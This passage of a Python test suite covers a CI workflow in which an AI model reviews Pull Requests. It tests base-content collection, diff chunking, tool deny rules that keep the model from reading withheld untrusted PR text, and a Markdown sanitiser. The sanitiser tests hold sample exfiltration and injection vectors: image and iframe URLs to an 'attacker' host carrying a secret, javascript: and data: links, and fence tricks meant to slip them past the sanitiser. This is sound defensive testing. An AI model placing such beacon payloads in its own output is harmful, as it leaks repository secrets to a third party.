        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            mode_only = _file("mode.sh", "modified", patch=None)
            mode_only["sha"] = same
            binary = _file("image.png", "modified", patch=None)
            binary["sha"] = "2" * 40
            _comparison(context, "d" * 40, [mode_only, binary])
            collector._provider_json = _provider(
                [],
                listings={
                    "": [
                        # Identical blob: only the mode changed.
                        {"name": "mode.sh", "type": "file", "sha": same},
                        # Different blob: the content changed with no hunks.
                        {"name": "image.png", "type": "file", "sha": "3" * 40},
                    ]
                },
                contents={
                    "mode.sh": _payload(b"#!/bin/sh\n"),
                    "image.png": _payload(b"\x89PNG\r\n"),
                },
            )
            collector.collect(context, "o/r", 4096)
            manifest = (context / "base.manifest").read_text(encoding="utf-8")
            self.assertIn("metadata-only mode.sh", manifest)
            self.assertIn("content-changed-without-hunks image.png", manifest)
            self.assertNotIn("metadata-only image.png", manifest)

    def test_prompt_defers_the_hunkless_verdict_to_the_manifest(self) -> None:
        prompt = " ".join(
            _claude_step(load_yaml(MENTION_WORKFLOW))["with"]["prompt"].split()
        )
        self.assertIn("base.manifest classifies it by blob identity", prompt)
        self.assertIn("content-changed-without-hunks as not", prompt)
        # The earlier claim was false and must not come back.
        self.assertNotIn("reviewable from its status", prompt)

    def test_a_file_the_budget_rejects_costs_no_request(self) -> None:
        # Fetching first made a large Pull Request full of binaries issue an avoidable
        # request per file, and a rate limit there fails the step -- leaving that Pull
        # Request without a review, which is the failure this workflow exists to remove.
        collector = _load_script(BASE_COLLECTOR)
        asked: list[str] = []
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(context, "d" * 40, [_file("huge.bin", "modified", patch=None)])
            collector._provider_json = _provider(
                asked,
                listings={
                    "": [{"name": "huge.bin", "type": "file", "size": 1_000_000}]
                },
                contents={"huge.bin": _payload(b"never fetched")},
            )
            written, unavailable = collector.collect(context, "o/r", 4096)
            self.assertEqual(0, written)
            self.assertEqual(["over-budget huge.bin"], unavailable)
            self.assertFalse(
                any("contents/huge.bin?" in url for url in asked),
                f"the content must not be requested at all: {asked}",
            )

    def test_a_removal_without_hunks_is_not_called_metadata_only(self) -> None:
        # For a removed entry the comparison's sha *is* the deleted base-side blob, so
        # it always equals the listing's. Comparing them would label a deletion
        # metadata-only and have the reviewer treat it as reviewable metadata.
        collector = _load_script(BASE_COLLECTOR)
        blob = "9" * 40
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            gone = _file("gone.bin", "removed", patch=None)
            gone["sha"] = blob
            _comparison(context, "d" * 40, [gone])
            collector._provider_json = _provider(
                [],
                listings={
                    "": [{"name": "gone.bin", "type": "file", "sha": blob, "size": 4}]
                },
                contents={"gone.bin": _payload(b"gone")},
            )
            collector.collect(context, "o/r", 4096)
            manifest = (context / "base.manifest").read_text(encoding="utf-8")
            self.assertIn("removed-without-hunks gone.bin", manifest)
            self.assertNotIn("metadata-only gone.bin", manifest)

    def test_a_hunkless_entry_is_classified_even_when_not_written(self) -> None:
        # A budget rejection or a decode failure must not leave the reviewer without a
        # verdict on whether the content changed.
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            rejected = _file("big.png", "modified", patch=None)
            rejected["sha"] = "a" * 40
            _comparison(context, "d" * 40, [rejected])
            collector._provider_json = _provider(
                [],
                listings={
                    "": [
                        {
                            "name": "big.png",
                            "type": "file",
                            "sha": "b" * 40,
                            "size": 999_999,
                        }
                    ]
                },
                contents={},
            )
            written, unavailable = collector.collect(context, "o/r", 16)
            self.assertEqual(0, written)
            self.assertEqual(["over-budget big.png"], unavailable)
            manifest = (context / "base.manifest").read_text(encoding="utf-8")
            self.assertIn("content-changed-without-hunks big.png", manifest)
            self.assertIn("over-budget big.png", manifest)

    def test_hunked_files_get_the_budget_before_hunkless_ones(self) -> None:
        # Otherwise a large binary, which has no hunks, could consume the budget ahead
        # of the textual change the review is actually about.
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(
                context,
                "d" * 40,
                [
                    _file("blob.bin", "modified", patch=None),
                    _file("code.py", "modified"),
                ],
            )
            collector._provider_json = _provider(
                [],
                listings={
                    "": [
                        {"name": "blob.bin", "type": "file", "size": 64},
                        {"name": "code.py", "type": "file", "size": 16},
                    ]
                },
                contents={
                    "blob.bin": _payload(b"B" * 64),
                    "code.py": _payload(b"C" * 16),
                },
            )
            written, unavailable = collector.collect(context, "o/r", 32)
            self.assertEqual(1, written)
            self.assertTrue((context / "base" / "code.py").is_file())
            self.assertEqual(["over-budget blob.bin"], unavailable)

    def test_the_budget_names_the_files_it_drops(self) -> None:
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(context, "d" * 40, [_file("big.py", "modified")])
            collector._provider_json = _provider(
                [],
                listings={"": [{"name": "big.py", "type": "file", "size": 64}]},
                contents={"big.py": _payload(b"x" * 64)},
            )
            written, unavailable = collector.collect(context, "o/r", 8)
            self.assertEqual(0, written)
            self.assertEqual(["over-budget big.py"], unavailable)
            self.assertIn(
                "over-budget big.py",
                (context / "base.manifest").read_text(encoding="utf-8"),
            )

    def test_collector_metadata_cannot_collide_with_a_repository_path(self) -> None:
        # A Pull Request that modifies a root-level README must still get its exact
        # pre-change bytes; the manifest lives outside base/ so it cannot overwrite it.
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(context, "d" * 40, [_file("README", "modified")])
            collector._provider_json = _provider(
                [],
                listings={"": [{"name": "README", "type": "file"}]},
                contents={"README": _payload(b"the real README\n")},
            )
            written, unavailable = collector.collect(context, "o/r", 4096)
            self.assertEqual(1, written)
            self.assertEqual([], unavailable)
            self.assertEqual(
                "the real README\n",
                (context / "base" / "README").read_text(encoding="utf-8"),
            )
            self.assertTrue((context / "base.manifest").is_file())

    def test_a_provider_failure_is_not_mistaken_for_an_added_file(self) -> None:
        # Only 404 means "the base does not hold this". A rate limit or server error
        # must stop the step rather than be recorded as an addition.
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(context, "d" * 40, [_file("src/a.py", "modified")])

            def boom(url: str) -> Any:
                raise urllib.error.HTTPError(url, 403, "rate limited", {}, None)  # type: ignore[arg-type]

            collector._provider_json = boom
            with self.assertRaises(urllib.error.HTTPError):
                collector.collect(context, "o/r", 4096)

    def test_the_real_request_path_is_exercised(self) -> None:
        # The ordinary modified-file fetch must not be reachable only through a fake:
        # this serves the provider's responses over real HTTP and lets urllib retrieve
        # them, so the request, the decode and the write all run for real.
        collector = _load_script(BASE_COLLECTOR)
        merge_base = "d" * 40
        listing = json.dumps([{"name": "a.py", "type": "file"}]).encode()
        content = json.dumps(_payload(b"served over http\n")).encode()

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self) -> None:
                body = (
                    listing
                    if self.path.startswith("/repos/o/r/contents/src?")
                    else content
                )
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_: object) -> None:
                return

        server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            host, port = server.server_address[0], server.server_address[1]
            collector._API = f"http://{host}:{port}"
            collector._URL = re.compile(
                rf"\Ahttp://{re.escape(str(host))}:{port}/repos/\S*\?ref=[0-9a-f]{{40}}\Z"
            )
            with tempfile.TemporaryDirectory() as scratch:
                context = pathlib.Path(scratch)
                _comparison(context, merge_base, [_file("src/a.py", "modified")])
                written, unavailable = collector.collect(context, "o/r", 4096)
                self.assertEqual(1, written)
                self.assertEqual([], unavailable)
                self.assertEqual(
                    "served over http\n",
                    (context / "base" / "src" / "a.py").read_text(encoding="utf-8"),
                )
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)

    def test_prompt_and_guardrail_cover_the_base_context(self) -> None:
        workflow = load_yaml(MENTION_WORKFLOW)
        script = str(_context_step(workflow)["run"])
        self.assertIn("build_review_context.py", script)
        prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
        self.assertIn("base/", prompt)
        # Pre-change reads are directed at base/ and away from the checkout: an
        # earlier prompt declared the checkout non-authoritative and then told the
        # reviewer to read it anyway.
        self.assertIn("Read base/, never the checkout", prompt)
        guardrails = load_yaml(ROOT / "policy" / "guardrails.yaml")
        entry = next(
            item
            for item in guardrails["guardrails"]
            if item["id"] == "immutable-provider-ci-adapters"
        )
        for owned in (
            ".github/review-context/build_review_context.py",
            ".github/review-context/publish_report.py",
        ):
            with self.subTest(owned=owned):
                self.assertIn(owned, entry["implementation"])

    def test_a_refused_diff_does_not_fail_the_step(self) -> None:
        # The step runs under `set -eu`, and the provider can refuse the diff of a very
        # large comparison. Exiting there would reproduce the large-Pull-Request
        # failure this whole Decision exists to remove.
        script = str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        self.assertIn("if ! gh api", script)
        # The refusal must not leave the reviewer without the change itself: the
        # per-file hunks assembled from the comparison take the diff's place.
        self.assertIn("refused the unified diff", script)
        self.assertIn("assembled.diff", script)
        self.assertIn("patches-source", script)

    def test_the_runner_event_payload_is_denied_to_every_tool(self) -> None:
        # The withheld issue and Pull Request bodies are still present in the raw event
        # payload on the runner, so denying only .ssh under /home leaves the gate the
        # prompt implements reachable around.
        claude = _claude_step(load_yaml(MENTION_WORKFLOW))
        denied = json.loads(str(claude["with"]["settings"]))["permissions"]["deny"]
        for fragment in ("_temp", "_actions", "event.json"):
            for tool in ("Read", "Grep", "Glob"):
                with self.subTest(fragment=fragment, tool=tool):
                    self.assertTrue(
                        any(
                            rule.startswith(f"{tool}(") and fragment in rule
                            for rule in denied
                        ),
                        f"no {tool} deny rule covers {fragment}",
                    )

    def test_base_content_comes_from_the_merge_base(self) -> None:
        # A three-dot comparison is computed from the merge base, so pre-change content
        # taken from the base branch tip would describe a different revision.
        source = BASE_COLLECTOR.read_text(encoding="utf-8")
        self.assertIn("merge_base_commit", source)
        # The step must not pass a base SHA of its own for this purpose.
        script = str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        self.assertNotIn(
            'build_review_context.py \\\n            "${CONTEXT_DIR}" "${REPOSITORY}" "${BASE_SHA}"',
            script,
        )

    def test_oversized_records_are_wrapped_below_the_reader_line_cap(self) -> None:
        # Fixing the UTF-8 split was not enough. The reviewer's Read tool truncates a
        # physical line beyond roughly two thousand characters and indexes by line, so
        # a minified or generated record would leave its tail unreachable while the
        # prompt claimed patches/ holds the whole diff.
        chunker = _load_script(CHUNKER)
        cap = chunker._LINE_CAP
        cases = {
            "short lines": b"alpha\nbeta\n",
            "one oversized record": b"x" * (cap * 3) + b"\ntail\n",
            "multibyte across the cap": b"a" * (cap - 1) + "é".encode() + b"b" * cap,
            "no trailing newline": b"y" * (cap + 5),
        }
        for name, payload in cases.items():
            with self.subTest(case=name):
                wrapped, count, continuations = chunker.wrap_long_records(payload)
                # Nothing removed, nothing reordered: a continuation adds exactly one
                # newline and one marker, and nothing else changes.
                marker = chunker._CONTINUATION
                self.assertEqual(
                    payload.replace(b"\n", b""),
                    wrapped.replace(b"\n" + marker, b"").replace(b"\n", b""),
                )
                for line in wrapped.split(b"\n"):
                    self.assertLessEqual(len(line), cap)
                # Every part must still stand alone as text.
                wrapped.decode("utf-8")
                self.assertEqual(
                    count > 0, any(len(r) > cap for r in payload.split(b"\n"))
                )
                self.assertEqual(count > 0, continuations > 0)

    def test_wrapped_continuations_cannot_read_as_diff_lines(self) -> None:
        # A continuation carries no diff prefix, so a segment beginning with "-" or
        # "+" would be attributed to the wrong side of the change, or a "+++ b/"
        # segment to the wrong file.
        chunker = _load_script(CHUNKER)
        cap = chunker._LINE_CAP
        marker = chunker._CONTINUATION
        record = b"-" + b"x" * (cap - 1) + b"-y" + b"z" * (cap - 3) + b"+tail"
        wrapped, count, continuations = chunker.wrap_long_records(record + b"\n")
        self.assertEqual(1, count)
        self.assertGreaterEqual(continuations, 2)
        lines = [line for line in wrapped.split(b"\n") if line]
        self.assertFalse(lines[0].startswith(marker))
        for line in lines[1:]:
            with self.subTest(line=line[:8]):
                self.assertTrue(line.startswith(marker), line[:8])

    def test_a_bound_crossed_only_by_wrapping_is_still_disclosed(self) -> None:
        # The bound notice must follow the number of parts produced, not the size of
        # the input. A diff that fits the bound until wrapping pushes it past would
        # otherwise yield several parts with diff.patch claiming to be the whole thing.
        chunker = _load_script(CHUNKER)
        cap = chunker._LINE_CAP
        payload = (b"w" * (cap + 1) + b"\n") * 2
        limit = len(payload) + 1
        self.assertLessEqual(len(payload), limit, "the input must fit before wrapping")
        wrapped, _, _ = chunker.wrap_long_records(payload)
        self.assertGreater(len(wrapped), limit, "wrapping must cross the bound")
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            (context / "diff.full").write_bytes(payload)
            parts = chunker.split_diff(context, limit)
            self.assertGreater(parts, 1)
            self.assertIn(
                "bounded at", (context / "diff.patch").read_text(encoding="utf-8")
            )

    def test_the_overview_is_written_by_the_chunker(self) -> None:
        # The step must not decide the notice from the pre-wrap byte count.
        script = str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        self.assertNotIn("cp ", script)
        self.assertNotIn("bounded at", script)
        self.assertIn("chunk_diff.py", script)

    def test_wrapping_is_disclosed_and_parts_stay_readable(self) -> None:
        chunker = _load_script(CHUNKER)
        cap = chunker._LINE_CAP
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            payload = b"z" * (cap * 2) + b"\n"
            (context / "diff.full").write_bytes(payload)
            chunker.split_diff(context, cap * 4)
            parts = sorted((context / "patches").glob("part-*"))
            self.assertTrue(parts)
            rejoined = b"".join(part.read_bytes() for part in parts)
            marker = chunker._CONTINUATION
            self.assertEqual(
                payload.replace(b"\n", b""),
                rejoined.replace(b"\n" + marker, b"").replace(b"\n", b""),
            )
            notice = (context / "patches" / "README").read_text(encoding="utf-8")
            self.assertIn("hard-wrapped", notice)
            self.assertIn(str(cap), notice)
            # The marker is disclosed, and why it is needed.
            self.assertIn(marker.decode(), notice)
            self.assertIn("continuation", notice)
            # Wrapping breaks line arithmetic inside the affected hunk, so the caveat
            # has to reach the reviewer rather than stay in the Decision.
            self.assertIn("approximate", notice)

    def test_commit_list_is_paginated_and_a_capped_file_list_says_so(self) -> None:
        # The provider paginates commits at 250 per page but caps files at 300 with no
        # pagination, so one needs every page and the other needs a notice.
        self.assertIn(
            "--paginate", str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        )
        collector = _load_script(BASE_COLLECTOR)
        self.assertEqual(300, collector._FILE_CAP)
        entry = {
            "status": "modified",
            "additions": 1,
            "deletions": 0,
            "filename": "f.txt",
            "sha": "a" * 40,
            "patch": "@@",
        }
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            collector.write_summaries(context, {"files": [dict(entry)] * 300})
            self.assertIn(
                "caps the changed-file list at 300",
                (context / "diff.stat").read_text(encoding="utf-8"),
            )
            collector.write_summaries(context, {"files": [dict(entry)]})
            self.assertNotIn(
                "caps", (context / "diff.stat").read_text(encoding="utf-8")
            )

    def test_a_missing_patch_is_recorded_without_inferring_the_file_type(self) -> None:
        # A binary or oversized file has no patch, and its bytes are in neither the
        # diff nor the base checkout, so it cannot be reviewed from this context.
        workflow = load_yaml(MENTION_WORKFLOW)
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            collector.write_summaries(
                context,
                {
                    "files": [
                        {
                            "status": "modified",
                            "additions": 1,
                            "deletions": 0,
                            "filename": "code.py",
                            "sha": "c" * 40,
                            "patch": "@@",
                        },
                        {
                            "status": "added",
                            "additions": 0,
                            "deletions": 0,
                            "filename": "asset.png",
                            "sha": "d" * 40,
                            "patch": None,
                        },
                    ]
                },
            )
            listed = (context / "no-patch.txt").read_text(encoding="utf-8")
            self.assertIn("asset.png", listed)
            self.assertNotIn("code.py", listed)
            # The listing must not assert a file type: a metadata-only change -- a mode
            # bit, an empty file, a pure rename -- also arrives without hunks and is
            # perfectly reviewable, so calling every such entry binary made the
            # reviewer report a real change as not examined.
            self.assertIn("metadata-only", listed)
            self.assertNotIn("must report it as not examined", listed)
        prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
        self.assertIn("no-patch.txt", prompt)
        self.assertIn("not examined", prompt)

    def test_the_action_does_not_render_the_report_itself(self) -> None:
        # The action's own input documents that display_report "should only be used in
        # cases where the action is used solely with trusted input". A candidate Pull
        # Request is untrusted by definition, and a step summary renders Markdown
        # including images, so the report is published by the repository instead.
        workflow = load_yaml(MENTION_WORKFLOW)
        claude = _claude_step(workflow)
        self.assertEqual("false", str(claude["with"]["display_report"]).lower())
        self.assertEqual(
            "false", str(claude["with"].get("show_full_output", "false")).lower()
        )
        publish = _named_step(workflow, "Publish the review report")
        self.assertIn("publish_report.py", str(publish["run"]))
        self.assertIn("GITHUB_STEP_SUMMARY", str(publish["run"]))
        # A failed reviewer must still report, rather than fail silently.
        self.assertIn("always()", str(publish["if"]))

    def test_the_session_is_bounded_in_turns(self) -> None:
        args = " ".join(
            str(
                _claude_step(load_yaml(MENTION_WORKFLOW))["with"]["claude_args"]
            ).split()
        )
        self.assertRegex(args, r"--max-turns \d+")

    def test_the_report_carries_no_render_time_fetch(self) -> None:
        # The hazard is passive: a step summary renders Markdown, so an image URL in a
        # report that echoes attacker-supplied text is fetched with no click. This is
        # the one channel the rest of Decision 0094 does not touch, because every other
        # control governs what the reviewer reads rather than what it publishes.
        publisher = _load_script(PUBLISHER)
        vectors = [
            "![](https://attacker/?q=secret)",
            "![alt][ref]",
            "<img src=https://attacker/x>",
            "<iframe src=https://attacker/></iframe>",
            "[click](javascript:alert(1))",
            "[d](data:text/html;base64,AAA)",
            "normal **text** and [a link](https://ok/)",
        ]
        raw = "\n".join(vectors)
        cleaned = publisher.neutralise(raw)

        def vectors_in(text: str) -> set[str]:
            found = set()
            for line in text.splitlines():
                if re.search(r"(?<!\\)!\[", line):
                    found.add("image")
                if "<" in line or ">" in line:
                    found.add("html")
                if re.search(r"(?i)(javascript|data|vbscript):", line):
                    found.add("scheme")
            return found

        # Control first: the checks must fire on the raw input, or they prove nothing.
        self.assertEqual({"image", "html", "scheme"}, vectors_in(raw))
        self.assertEqual(set(), vectors_in(cleaned))
        # Ordinary review prose must survive, or the sanitiser is useless.
        self.assertIn("**text**", cleaned)
        self.assertIn("[a link](https://ok/)", cleaned)

    def test_no_rendered_line_escapes_the_sanitiser(self) -> None:
        # The invariant that matters is not "images are escaped somewhere" but: every
        # line Markdown will actually render must have been sanitised. An earlier
        # version normalised every fence to three characters, so a four-backtick open
        # could be "closed" by three and reopened by four -- Markdown left the code
        # block while the scanner believed it was still inside, and the rest was
        # published raw.
        publisher = _load_script(PUBLISHER)
        tick = "`"

        def rendered_lines(text: str) -> list[str]:
            """Return the lines CommonMark would render, tracked independently."""
            inside: tuple[str, int] | None = None
            visible: list[str] = []
            for line in text.splitlines():
                match = re.match(r"\A {0,3}(`{3,}|~{3,})(.*)\Z", line)
                run = match.group(1) if match else ""
                rest = match.group(2) if match else ""
                if inside is None:
                    if match and not (run[0] == "`" and "`" in rest):
                        inside = (run[0], len(run))
                        continue
                    visible.append(line)
                else:
                    character, length = inside
                    if (
                        match
                        and run[0] == character
                        and len(run) >= length
                        and not rest.strip()
                    ):
                        inside = None
            return visible

        cases = {
            "four then three then four": [
                tick * 4,
                "harmless",
                tick * 3,
                tick * 4,
                "![](https://attacker/?q=leak)",
            ],
            "tilde fence with backticks inside": [
                "~~~",
                tick * 3,
                "![](https://inside/)",
                "~~~",
                "![](https://outside/)",
            ],
            "close with trailing text is not a close": [
                tick * 3,
                tick * 3 + " evil",
                "![](https://inside/)",
                tick * 3,
                "![](https://outside/)",
            ],
            "indented fence": [
                "   " + tick * 3,
                "![](https://inside/)",
                "   " + tick * 3,
                "![](https://outside/)",
            ],
            "never closed": [tick * 3, "![](https://inside/)"],
            # CommonMark says a backtick fence's info string may not contain a
            # backtick, so this line is not a fence and what follows renders.
            "backtick in the info string": [
                tick * 3 + "x" + tick,
                "![](https://outside/)",
            ],
            # A tab is four columns of indent, so this is indented code, not a fence.
            "tab-indented run": ["\t" + tick * 3, "![](https://outside/)"],
            "over-indented run": ["    " + tick * 3, "![](https://outside/)"],
        }
        for name, lines in cases.items():
            with self.subTest(case=name):
                raw = "\n".join(lines)
                cleaned = publisher.neutralise(raw)
                for line in rendered_lines(cleaned):
                    self.assertNotRegex(
                        line, r"(?<!\\)!\[", f"{name}: a rendered line kept an image"
                    )
                    self.assertNotIn("<", line, f"{name}: a rendered line kept HTML")
                # Control: the same oracle must find the vector in the raw text, or the
                # case is not exercising anything.
                if "outside" in raw or "leak" in raw:
                    self.assertTrue(
                        any(
                            re.search(r"(?<!\\)!\[", line)
                            for line in rendered_lines(raw)
                        ),
                        f"{name}: the raw input rendered no image, so this proves nothing",
                    )

    def test_fenced_code_is_left_readable(self) -> None:
        # Nothing inside a fence renders, and a report about code is unreadable if its
        # code is escaped.
        publisher = _load_script(PUBLISHER)
        body = (
            "before\n```python\nx = a < b and c > d  # ![](https://x/)\n```\nafter <b>"
        )
        cleaned = publisher.neutralise(body)
        self.assertIn("x = a < b and c > d  # ![](https://x/)", cleaned)
        self.assertIn("after &lt;b&gt;", cleaned)

    def test_the_report_is_extracted_and_bounded(self) -> None:
        publisher = _load_script(PUBLISHER)
        with tempfile.TemporaryDirectory() as scratch:
            path = pathlib.Path(scratch) / "execution.json"
            path.write_text(
                json.dumps(
                    [
                        {
                            "type": "assistant",
                            "message": {"content": [{"text": "early"}]},
                        },
                        {
                            "type": "result",
                            "result": "F" * (publisher._MAX_BYTES + 500),
                        },
                    ]
                ),
                encoding="utf-8",
            )
            rendered = publisher.render(path)
            self.assertIn("truncated", rendered)
            self.assertLess(len(rendered.encode("utf-8")), publisher._MAX_BYTES + 2048)

            # With no result turn, the last assistant text is used instead.
            path.write_text(
                json.dumps(
                    [
                        {
                            "type": "assistant",
                            "message": {"content": [{"text": "only this"}]},
                        }
                    ]
                ),
                encoding="utf-8",
            )
            self.assertIn("only this", publisher.render(path))

            # A malformed file reports that, rather than publishing nothing.
            path.write_text("not json", encoding="utf-8")
            self.assertIn("unavailable", publisher.render(path))

    def test_every_review_context_script_confines_its_paths(self) -> None:
        # These scripts take their paths from the workflow, which is trusted. The value
        # is still checked where it is used: a later workflow edit must not be able to
        # point a collector or the publisher outside the runner area it belongs to.
        for script, variable in (
            (BASE_COLLECTOR, "GITHUB_WORKSPACE"),
            (CHUNKER, "GITHUB_WORKSPACE"),
            (PUBLISHER, "RUNNER_TEMP"),
        ):
            # The publisher's *summary* path is deliberately not held to a root -- see
            # the test below -- but its execution file is.
            module = _load_script(script)
            with (
                self.subTest(script=script.name),
                tempfile.TemporaryDirectory() as root,
            ):
                inside = pathlib.Path(root) / "within"
                inside.mkdir()
                previous = os.environ.get(variable)
                os.environ[variable] = root
                try:
                    self.assertEqual(
                        inside.resolve(),
                        module._within(str(inside), variable, must_exist=True),
                    )
                    for refused in ("/etc", "/", str(pathlib.Path(root).parent)):
                        with self.subTest(refused=refused):
                            with self.assertRaises(ValueError):
                                module._within(refused, variable, must_exist=True)
                    # A path that does not exist is refused rather than created.
                    with self.assertRaises(ValueError):
                        module._within(
                            str(inside / "absent"), variable, must_exist=True
                        )
                finally:
                    if previous is None:
                        del os.environ[variable]
                    else:
                        os.environ[variable] = previous

    def test_the_summary_path_is_checked_without_pinning_a_root(self) -> None:
        # GITHUB_STEP_SUMMARY lives under RUNNER_TEMP on today's hosted runners, but
        # that is an implementation detail: refusing the report because the runner moved
        # a file would lose the review over an assumption about its layout.
        publisher = _load_script(PUBLISHER)
        with (
            tempfile.TemporaryDirectory() as root,
            tempfile.TemporaryDirectory() as elsewhere,
        ):
            previous = os.environ.get("RUNNER_TEMP")
            os.environ["RUNNER_TEMP"] = root
            try:
                outside = pathlib.Path(elsewhere) / "summary.md"
                # Accepted although it sits outside RUNNER_TEMP ...
                self.assertEqual(
                    outside.resolve(),
                    publisher._within(str(outside), "", must_exist=False),
                )
                # ... but a path whose parent does not exist is still refused.
                with self.assertRaises(ValueError):
                    publisher._within(
                        str(pathlib.Path(elsewhere) / "absent" / "summary.md"),
                        "",
                        must_exist=False,
                    )
            finally:
                if previous is None:
                    del os.environ["RUNNER_TEMP"]
                else:
                    os.environ["RUNNER_TEMP"] = previous

    def test_deny_rules_cover_every_granted_filesystem_tool(self) -> None:
        # A Read deny rule does not constrain Grep: ripgrep would return matching
        # lines from the same path. Every granted filesystem tool needs the boundary.
        workflow = load_yaml(MENTION_WORKFLOW)
        claude = _claude_step(workflow)
        settings = json.loads(str(claude["with"]["settings"]))
        denied = settings["permissions"]["deny"]
        args = str(claude["with"].get("claude_args", ""))
        granted = [
            tool.strip()
            for tool in re.findall(r'--allowedTools\s+"([^"]+)"', args)[0].split(",")
            if tool.strip() in {"Read", "Grep", "Glob"}
        ]
        self.assertEqual({"Read", "Grep", "Glob"}, set(granted))
        paths = {
            rule[rule.index("(") + 1 : rule.rindex(")")]
            for rule in denied
            if rule.startswith("Read(")
        }
        self.assertTrue(paths)
        for tool in granted:
            for path in paths:
                with self.subTest(tool=tool, path=path):
                    self.assertIn(f"{tool}({path})", denied)

    def test_prompt_does_not_claim_the_checkout_is_the_pull_request_base(self) -> None:
        # The checkout is the default branch's current tip, which may have advanced
        # past the Pull Request's base or belong to a different branch entirely.
        prompt = " ".join(
            _claude_step(load_yaml(MENTION_WORKFLOW))["with"]["prompt"].split()
        )
        self.assertIn("default branch", prompt)
        self.assertIn("may have advanced past Base", prompt)
        self.assertNotIn("checkout is the Pull Request's **base**", prompt)
        self.assertNotIn("Read or Grep the checkout for the pre-change", prompt)

    def test_review_context_is_collected_with_fixed_arguments(self) -> None:
        # The retrieval must take no candidate-controlled input, or the trusted
        # step becomes the injection surface the grant used to be.
        step = _context_step(load_yaml(MENTION_WORKFLOW))
        script = str(step["run"])
        # Item type comes from the resolved pull number, not from SHA equality:
        # a merged or emptied Pull Request reports an equal base and head.
        self.assertIn("PULL_NUMBER", script)
        self.assertNotIn('"${BASE_SHA}" = "${HEAD_SHA}"', script)
        self.assertNotIn("github.event", script)
        self.assertNotIn("${{", script)
        for value in (str(v) for v in step["env"].values()):
            with self.subTest(value=value):
                self.assertNotIn("github.event", value)

    def test_collected_review_context_is_bounded_and_complete(self) -> None:
        # Behavioural: the step is executed against a stubbed provider, so the
        # artefacts the prompt names must actually appear, the bound must actually
        # apply, and no region of the diff may become unreachable.
        if _SH is None:  # pragma: no cover - toolchain guard
            self.skipTest("sh is required to execute the collection step")
        script = str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        with tempfile.TemporaryDirectory() as scratch:
            work = pathlib.Path(scratch)
            stub_dir = work / "bin"
            stub_dir.mkdir()
            stub = stub_dir / "gh"
            # The stub answers from files, so no response has to survive nested
            # shell quoting inside a Python string.
            (stub_dir / "total_commits").write_text("3\n", encoding="utf-8")
            (stub_dir / "commits").write_text("abcdef123 second\n", encoding="utf-8")
            (stub_dir / "contents").write_text(
                json.dumps({"content": base64.b64encode(b"before\n").decode()}),
                encoding="utf-8",
            )
            (stub_dir / "comparison").write_text(
                json.dumps(
                    {
                        "files": [
                            {
                                # Added, so the base holds nothing and the step needs
                                # no network: the fetch paths have their own tests,
                                # including one against a real HTTP server.
                                "filename": "f.txt",
                                "patch": None,
                                "status": "added",
                                "additions": 4000,
                                "deletions": 1,
                                "sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            stub.write_text(
                "#!/bin/sh\n"
                'for a in "$@"; do\n'
                '  case "$a" in *v3.diff*) cat "${FIXTURE_DIFF}"; exit 0;; esac\n'
                "done\n"
                'case "$*" in\n'
                '  *total_commits*) cat "${STUB_DIR}/total_commits" ;;\n'
                '  *commits*) cat "${STUB_DIR}/commits" ;;\n'
                '  *contents*) cat "${STUB_DIR}/contents" ;;\n'
                '  *compare*) cat "${STUB_DIR}/comparison" ;;\n'
                "esac\n",
                encoding="utf-8",
            )
            stub.chmod(0o755)

            big = work / "big.diff"
            big.write_text(
                "diff --git a/f.txt b/f.txt\n"
                + "".join(f"+line {n}\n" for n in range(4000)),
                encoding="utf-8",
            )
            empty = work / "empty.diff"
            empty.write_text("", encoding="utf-8")

            def collect(
                target: pathlib.Path,
                fixture: pathlib.Path,
                pull: str = "327",
            ) -> None:
                result = subprocess.run(  # nosec B603  # nosemgrep: python.lang.security.audit.dangerous-subprocess-use-audit.dangerous-subprocess-use-audit, python.lang.security.audit.dangerous-subprocess-use-tainted-env-args.dangerous-subprocess-use-tainted-env-args
                    [str(_SH), "-s"],
                    input=script,
                    # The step invokes the committed chunker by repository-relative
                    # path, exactly as it does at the workspace root in CI.
                    cwd=ROOT,
                    capture_output=True,
                    text=True,
                    env={
                        **os.environ,
                        "HOME": scratch,
                        "PATH": f"{stub_dir}{os.pathsep}{os.environ['PATH']}",
                        # nosec B105 -- literal placeholder for the stubbed
                        # provider, not a credential
                        "GH_TOKEN": "stub",  # nosec B105
                        "REPOSITORY": "owner/repo",
                        "PULL_NUMBER": pull,
                        "BASE_SHA": "a" * 40,
                        "HEAD_SHA": "b" * 40,
